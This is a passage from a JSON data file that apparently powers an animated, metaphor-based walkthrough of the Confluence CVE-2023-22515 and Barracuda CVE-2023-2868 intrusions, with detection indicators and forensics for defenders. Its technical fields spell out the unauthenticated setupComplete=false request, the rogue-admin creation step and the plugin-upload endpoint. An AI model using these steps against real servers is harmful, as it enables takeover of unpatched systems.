          "stageTag": "STAGE 02 · PERSISTENCE",
          "title": "Rogue Admin Provisioning (/setup/setupadministrator.action)",
          "storyExcerpt": "Because the building now believes it is opening day again, the setup counter gladly accepts a brand-new head librarian profile from the outsider and closes the setup latch afterward.",
          "technicalParallel": "Calling /setup/finishsetup.action is a critical operational security step for the attacker: if setupComplete were left as false, every employee visiting the company wiki would be redirected to the…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Desk",
          "stageTag": "STAGE 03 · PERSISTENCE",
          "title": "Malicious OSGi Plugin Upload & JVM Shell Execution",
          "storyExcerpt": "Signed in as head librarian, the outsider uploads a custom library plug-in box through the extension desk. Once mounted, the plug-in opens a direct workshop line to execute building commands.",
          "technicalParallel": "Because Confluence plugins run inside the same Tomcat JVM process as the core application, a malicious OSGi plugin can both execute OS commands via Runtime.getRuntime().exec() and intercept cleartext…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Library Switch",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Admin Desk",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Key Handoff",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "atlassian-confluence-cve-2023-22515-storm0062",
      "sectionKey": "step-1",
      "sceneKind": "net-confluence-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Flipping setupComplete=false via XWork Getter/Setter Chaining on /server-info.action",
      "storyCue": "An outsider sends a chained property request to the public status desk. Following the chain of internal dials, the server unknowingly flips its own \"setup finished\" latch back to open.",
      "technicalCue": "T1190 · INITIAL ACCESS — Storm-0062 sends an unauthenticated GET request to /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false (an HTTP query string that abuses Apache Struts / XWork OGNL…",
      "storyMappings": [
        {
          "storyTerm": "Public status desk",
          "technicalTerm": "Unauthenticated /server-info.action endpoint",
          "tone": "amber"
        },
        {
          "storyTerm": "Chained internal dials",
          "technicalTerm": "XWork getter/setter parameter traversal",
          "tone": "sky"
        },
        {
          "storyTerm": "Setup-finished latch",
          "technicalTerm": "bootstrapStatusProvider.applicationConfig.setupComplete flag",
          "tone": "rose"
        },
        {
          "storyTerm": "Library entrance log",
          "technicalTerm": "Tomcat conf_access_log HTTP request records",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-confluence-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Public status desk",
          "subtitle": "Unauthenticated /server-info.action endpoint",
          "tone": "amber"
        },
        {
          "id": "net-confluence-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Chained internal dials",
          "subtitle": "XWork getter/setter parameter traversal",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Desk",
          "stageTag": "STEP 01 · SETUP",
          "title": "Public status desk",
          "storyExcerpt": "An outsider sends a chained property request to the public status desk.",
          "technicalParallel": "Because ServerInfoAction inherits from ConfluenceActionSupport, which exposes a public getBootstrapStatusProvider() getter returning the global BootstrapStatusProvider bean, XWork’s ParametersInterceptor…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Own Back",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Chained internal dials",
          "storyExcerpt": "Following the chain of internal dials, the server unknowingly flips its own \"setup finished\" latch back to open.",
          "technicalParallel": "Storm-0062 sends an unauthenticated GET request to /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false (an HTTP query string that abuses Apache Struts / XWork OGNL parameter…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Log",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Library entrance log",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across library entrance log while locking down setup-finished latch.",
          "technicalParallel": "Documented in CISA AA23-289A and Rapid7 (web log signatures for CVE-2023-22515 exploitation): Tomcat conf_access_log entries for /server-info.action containing…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Library Switch",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Admin Desk",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Key Handoff",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "atlassian-confluence-cve-2023-22515-storm0062",
      "sectionKey": "step-2",
      "sceneKind": "net-confluence-step-2",
      "stageBadge": "STEP #2 · PERSISTENCE",
      "title": "Creating a Rogue confluence-administrators User via /setup/setupadministrator.action",
      "storyCue": "Because the building now believes it is opening day again, the setup counter gladly accepts a brand-new head librarian profile from the outsider and closes the setup latch afterward.",
      "technicalCue": "T1136.001 · PERSISTENCE — With the setup wizard unlocked, the attacker sends a POST request to /setup/setupadministrator.action with the header X-Atlassian-Token: no-check (an Atlassian header that bypasses Cross-Site…",
      "storyMappings": [
        {
          "storyTerm": "Reopened setup counter",
          "technicalTerm": "/setup/setupadministrator.action registration endpoint",
          "tone": "amber"
        },
        {
          "storyTerm": "Closing the setup latch",
          "technicalTerm": "/setup/finishsetup.action completion request",
          "tone": "sky"
        },
        {
          "storyTerm": "Head librarian group",
          "technicalTerm": "Privileged confluence-administrators role",
          "tone": "rose"
        },
        {
          "storyTerm": "Membership audit trail",
          "technicalTerm": "Application audit logs showing unexpected admin creation",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-confluence-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Reopened setup counter",
          "subtitle": "/setup/setupadministrator.action registration endpoint",
          "tone": "amber"
        },
        {
          "id": "net-confluence-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Closing the setup latch",
          "subtitle": "/setup/finishsetup.action completion request",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Now It",
          "stageTag": "STEP 02 · SETUP",
          "title": "Reopened setup counter",
          "storyExcerpt": "Because the building now believes it is opening day again, the setup counter gladly accepts a brand-new head librarian profile from the outsider and closes the setup latch afterward.",
          "technicalParallel": "Calling /setup/finishsetup.action is a critical operational security step for the attacker: if setupComplete were left as false, every employee visiting the company wiki would be redirected to the…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Head",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Closing the setup latch",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses closing the setup latch to advance toward head librarian group.",
          "technicalParallel": "With the setup wizard unlocked, the attacker sends a POST request to /setup/setupadministrator.action with the header X-Atlassian-Token: no-check (an Atlassian header that bypasses Cross-Site Request…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Head",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Membership audit trail",
          "storyExcerpt": "Behind the scenes, membership audit trail captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in CISA AA23-289A (administrative compromise indicators): HTTP 200 or 302 requests to /setup/setupadministrator.action and /setup/finishsetup.action paired with unexpected additions to the…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Library Switch",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Admin Desk",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Key Handoff",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1136.001"
    },
    "step-3": {
      "scenarioId": "atlassian-confluence-cve-2023-22515-storm0062",
      "sectionKey": "step-3",
      "sceneKind": "net-confluence-step-3",
      "stageBadge": "STEP #3 · PERSISTENCE",
      "title": "Uploading a Malicious OSGi Servlet Plugin via /rest/plugins/1.0/ for JVM Shell Execution",
      "storyCue": "Signed in as head librarian, the outsider uploads a custom library plug-in box through the extension desk. Once mounted, the plug-in opens a direct workshop line to execute building commands.",
      "technicalCue": "T1505.003 · PERSISTENCE — Authenticating with the newly created rogue administrator account, Storm-0062 calls the Universal Plugin Manager endpoint /rest/plugins/1.0/ to upload a malicious OSGi servlet plugin (.jar) (a…",
      "storyMappings": [
        {
          "storyTerm": "Extension upload desk",
          "technicalTerm": "POST /rest/plugins/1.0/ plugin management endpoint",
          "tone": "amber"
        },
        {
          "storyTerm": "Custom plug-in box",
          "technicalTerm": "Malicious OSGi Java servlet plugin archive",
          "tone": "sky"
        },
        {
          "storyTerm": "Library service engine",
          "technicalTerm": "Confluence Java runtime process",
          "tone": "rose"
        },
        {
          "storyTerm": "Workshop command line",
          "technicalTerm": "Spawned shell interpreters (bash, cmd.exe, powershell.exe)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-confluence-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Extension upload desk",
          "subtitle": "POST /rest/plugins/1.0/ plugin management endpoint",
          "tone": "amber"
        },
        {
          "id": "net-confluence-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Custom plug-in box",
          "subtitle": "Malicious OSGi Java servlet plugin archive",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Desk",
          "stageTag": "STEP 03 · SETUP",
          "title": "Extension upload desk",
          "storyExcerpt": "Signed in as head librarian, the outsider uploads a custom library plug-in box through the extension desk.",
          "technicalParallel": "Because Confluence plugins run inside the same Tomcat JVM process as the core application, a malicious OSGi plugin can both execute OS commands via Runtime.getRuntime().exec() and intercept cleartext…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Plug-in Box",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Custom plug-in box",
          "storyExcerpt": "Once mounted, the plug-in opens a direct workshop line to execute building commands.",
          "technicalParallel": "Authenticating with the newly created rogue administrator account, Storm-0062 calls the Universal Plugin Manager endpoint /rest/plugins/1.0/ to upload a malicious OSGi servlet plugin (.jar) (a compiled…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Line",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Workshop command line",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across workshop command line while locking down library service engine.",
          "technicalParallel": "Documented by Microsoft and CISA AA23-289A (post-takeover execution indicators): POST /rest/plugins/1.0/ followed by the Confluence Java process spawning /bin/sh, bash, cmd.exe, or powershell.exe…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Library Switch",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Admin Desk",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Key Handoff",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.003"
    },
    "memory-forensics": {
      "scenarioId": "atlassian-confluence-cve-2023-22515-storm0062",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-confluence-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "Storm-0062: Atlassian Confluence XWork OGNL Setup Reset & OSGi Webshell — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of library switch beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: java (Confluence Tomcat) (ApplicationConfiguration Singleton (JVM Heap) [RW-])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of java (Confluence Tomcat)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x0000000701200000 (RW-, 64 KB) · ApplicationConfiguration Singleton (JVM Heap)",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against java (Confluence Tomcat) (PID 4410)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "In-memory ApplicationConfiguration bean where setupComplete is flipped from true to false via XWork parameter binding.",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-confluence-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of java…",
          "tone": "sky"
        },
        {
          "id": "net-confluence-memory-xray-right",
          "tag": "LIVE MEMORY · RW-",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x0000000701200000 (RW-, 64 KB) · ApplicationConfiguration…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline java (Confluence Tomcat) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x0000000701200000 (RW-, 64 KB) containing ApplicationConfiguration Singleton (JVM Heap).",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 4410 confirms patched region: In-memory ApplicationConfiguration bean where setupComplete is flipped from true to false via XWork parameter binding.",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "barracuda-esg-cve-2023-2868-unc4841": {
    "briefing": {
      "scenarioId": "barracuda-esg-cve-2023-2868-unc4841",
      "sectionKey": "briefing",
      "sceneKind": "net-barracuda-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "UNC4841: Barracuda ESG .tar Command Injection, SALTWATER & SEASPY… — Story-to-Technical Overview",
      "storyCue": "A corporate mail-screening station opens every incoming parcel bundle automatically before forwarding letters inside. An outsider mails a parcel whose wrapped item label slips an instruction into the sorting script, installs two hidden watchers inside the mailroom, and adds a database tripwire that revives access even after routine repairs.",
      "technicalCue": "INITIAL ACCESS: MALICIOUS .TAR ATTACHMENT FILENAME INJECTION (CVE-2023-2868) -> PERSISTENCE: IMPLANTING \"SALTWATER\" (BSMTP) & \"SEASPY\" (PCAP SNIFFER) -> EXFIL & IMPACT: DEEP PERSISTENCE VIA \"SUBMARINE\" & EMAIL SPOOL EXFILTRATION",
      "storyMappings": [
        {
          "storyTerm": "Corporate mail-screening station",
          "technicalTerm": "Barracuda Email Security Gateway appliance",
          "tone": "amber"
        },
        {
          "storyTerm": "Wrapped item label trick",
          "technicalTerm": "Sanitization flaw on tar member filenames (CVE-2023-2868)",
          "tone": "sky"
        },
        {
          "storyTerm": "Two hidden mailroom watchers",
          "technicalTerm": "SALTWATER mail module and SEASPY passive listener",
          "tone": "rose"
        },
        {
          "storyTerm": "Self-reviving ledger tripwire",
          "technicalTerm": "SUBMARINE persistent SQLite database triggers",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-barracuda-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Corporate mail-screening station",
          "subtitle": "Barracuda Email Security Gateway appliance",
          "tone": "amber"
        },
        {
          "id": "net-barracuda-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Wrapped item label trick",
          "subtitle": "Sanitization flaw on tar member filenames (CVE-2023-2868)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Mail",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "MALICIOUS .TAR ATTACHMENT FILENAME INJECTION (CVE-2023-2868)",
          "storyExcerpt": "Without anyone opening an email, the automated mail scanner inspects a bundled parcel whose inner label breaks out of the packaging quote marks and hands a direct task to the sorting bench.",
          "technicalParallel": "Because the vulnerability triggers inside the perimeter email security scanner itself before delivery, even emails addressed to non-existent or bounced recipients could trigger the exploit on unpatched…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Item",
          "stageTag": "STAGE 02 · PERSISTENCE",
          "title": "IMPLANTING \"SALTWATER\" (BSMTP) & \"SEASPY\" (PCAP SNIFFER)",
          "storyExcerpt": "Inside the sorting room, the intruder embeds a quiet courier assistant inside the mail delivery program and stations a silent doorframe listener that wakes up only when a secret knock arrives.",
          "technicalParallel": "Why use a libpcap sniffer (SEASPY) for persistence? Because even if a firewall blocks all ports except SMTP port 25, SEASPY inspects raw Ethernet frames arriving on port 25 before they reach the mail…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Book",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "DEEP PERSISTENCE VIA \"SUBMARINE\" & EMAIL SPOOL EXFILTRATION",
          "storyExcerpt": "To survive routine building maintenance, the intruder attaches automatic rules inside the station record books that relaunch hidden helpers whenever normal settings refresh, while boxing up sensitive…",
          "technicalParallel": "Because UNC4841 compromised multiple layers of the appliance (SQLite triggers, kernel modules, and device SSL certificates), both Barracuda Networks and CISA issued the rare directive that all…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Mail Screening",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Gateway Arch",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Parcel Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "barracuda-esg-cve-2023-2868-unc4841",
      "sectionKey": "step-1",
      "sceneKind": "net-barracuda-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Zero-Click SMTP .tar Filename Command Injection in Perl (CVE-2023-2868)",
      "storyCue": "Without anyone opening an email, the automated mail scanner inspects a bundled parcel whose inner label breaks out of the packaging quote marks and hands a direct task to the sorting bench.",
      "technicalCue": "T1190 · INITIAL ACCESS — UNC4841 sends an external MIME email over SMTP port 25 containing a specially formatted .tar archive attachment.",
      "storyMappings": [
        {
          "storyTerm": "Automated mail scanner",
          "technicalTerm": "Appliance Perl attachment screening parser",
          "tone": "amber"
        },
        {
          "storyTerm": "Bundled parcel attachment",
          "technicalTerm": "Inbound SMTP tar archive attachment",
          "tone": "sky"
        },
        {
          "storyTerm": "Broken quote-mark label",
          "technicalTerm": "Unsanitized archive member name (CVE-2023-2868)",
          "tone": "rose"
        },
        {
          "storyTerm": "Perimeter inspection sensor",
          "technicalTerm": "Network IDS signature monitoring inbound SMTP headers",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-barracuda-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Automated mail scanner",
          "subtitle": "Appliance Perl attachment screening parser",
          "tone": "amber"
        },
        {
          "id": "net-barracuda-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Bundled parcel attachment",
          "subtitle": "Inbound SMTP tar archive attachment",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Mail",
          "stageTag": "STEP 01 · SETUP",
          "title": "Automated mail scanner",
          "storyExcerpt": "Without anyone opening an email, the automated mail scanner inspects a bundled parcel whose inner label breaks out of the packaging quote marks and hands a direct task to the sorting bench.",
          "technicalParallel": "Because the vulnerability triggers inside the perimeter email security scanner itself before delivery, even emails addressed to non-existent or bounced recipients could trigger the exploit on unpatched…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Bundled parcel attachment",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses bundled parcel attachment to advance toward broken quote-mark label.",
          "technicalParallel": "UNC4841 sends an external MIME email over SMTP port 25 containing a specially formatted .tar archive attachment.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Mail Out",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Perimeter inspection sensor",
          "storyExcerpt": "Behind the scenes, perimeter inspection sensor captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Mandiant, CISA, and Suricata SID 2045992 (network signatures for zero-click email gateway exploitation): Inbound SMTP tar attachments containing malformed quote and pipe delimiters inside…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Mail Screening",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Gateway Arch",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Parcel Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "barracuda-esg-cve-2023-2868-unc4841",
      "sectionKey": "step-2",
      "sceneKind": "net-barracuda-step-2",
      "stageBadge": "STEP #2 · PERSISTENCE",
      "title": "Deploying \"SALTWATER\" (/usr/sbin/bsmtp) & \"SEASPY\" (libpcap Passive Backdoor)",
      "storyCue": "Inside the sorting room, the intruder embeds a quiet courier assistant inside the mail delivery program and stations a silent doorframe listener that wakes up only when a secret knock arrives.",
      "technicalCue": "T1505.003 · PERSISTENCE — With root access on the appliance, UNC4841 installs two stealthy backdoors analyzed by Mandiant and CISA: (1) SALTWATER (a trojanized replacement for the legitimate Barracuda SMTP daemon…",
      "storyMappings": [
        {
          "storyTerm": "Quiet courier assistant",
          "technicalTerm": "SALTWATER trojanized /usr/sbin/bsmtp module",
          "tone": "amber"
        },
        {
          "storyTerm": "Silent doorframe listener",
          "technicalTerm": "SEASPY libpcap passive network monitor",
          "tone": "sky"
        },
        {
          "storyTerm": "Mail delivery program",
          "technicalTerm": "Appliance SMTP processing daemon",
          "tone": "rose"
        },
        {
          "storyTerm": "Binary authenticity scan",
          "technicalTerm": "CISA YARA signatures checking modified gateway binaries",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-barracuda-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Quiet courier assistant",
          "subtitle": "SALTWATER trojanized /usr/sbin/bsmtp module",
          "tone": "amber"
        },
        {
          "id": "net-barracuda-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Silent doorframe listener",
          "subtitle": "SEASPY libpcap passive network monitor",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Room Mail",
          "stageTag": "STEP 02 · SETUP",
          "title": "Quiet courier assistant",
          "storyExcerpt": "Inside the sorting room, the intruder embeds a quiet courier assistant inside the mail delivery program and stations a silent doorframe listener that wakes up only when a secret knock arrives.",
          "technicalParallel": "Why use a libpcap sniffer (SEASPY) for persistence? Because even if a firewall blocks all ports except SMTP port 25, SEASPY inspects raw Ethernet frames arriving on port 25 before they reach the mail…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Mail",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Silent doorframe listener",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses silent doorframe listener to advance toward mail delivery program.",
          "technicalParallel": "With root access on the appliance, UNC4841 installs two stealthy backdoors analyzed by Mandiant and CISA: (1) SALTWATER (a trojanized replacement for the legitimate Barracuda SMTP daemon /usr/sbin/bsmtp…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Mail",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Binary authenticity scan",
          "storyExcerpt": "Behind the scenes, binary authenticity scan captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in CISA MAR-10454006 (official malware analysis report for UNC4841 implants): YARA signature matches against modified /usr/sbin/bsmtp (SALTWATER) and /usr/sbin/BarracudaMailService (SEASPY)…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Mail Screening",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Gateway Arch",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Parcel Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.003"
    },
    "step-3": {
